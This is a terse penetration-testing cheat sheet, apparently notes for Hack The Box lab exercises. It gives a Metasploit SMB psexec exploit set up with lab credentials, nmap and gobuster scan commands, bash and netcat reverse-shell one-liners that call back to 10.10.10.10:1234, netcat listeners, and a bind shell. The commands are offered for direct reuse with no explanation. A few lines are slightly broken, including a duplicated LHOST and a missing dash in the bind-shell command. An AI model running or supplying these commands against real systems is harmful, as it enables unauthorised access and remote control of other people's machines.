
MSF SMB:
```shell
msfconsole
search exploit/windows/smb/psexec
use 0
set Rhosts 10.10.10.10
set LHOST 10.10.10.10
set LHOST 10.10.10.10
set SMBUser htb-student
set SMBPass HTB_@cademy_stdnt!
exploit
```
Alap parancsok:
nmap:
```shell
nmap -sCV 10.10.10.10
```
Wget python
```shell
python3 -m http.server 8000
```
Dir gobuster
```shell
gobuster dir -u http://link.link -w /usr/share/seclists/Discovery/Web-Content/common.txt -o dev_linkvortex_htb_gobuster
```
Subdomain gobuster
```shell
gobuster vhost -u http://link.link -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain -r -o linkvortex_subdomain_gobuster
```
reverseshell:
```shell
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

```shell
nc -lvnp 1234
```
bindshell:
```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash i 2>&1|nc -lvp 1234 >/tmp/f
```

```shell
nc 10.10.10.10 1234
```
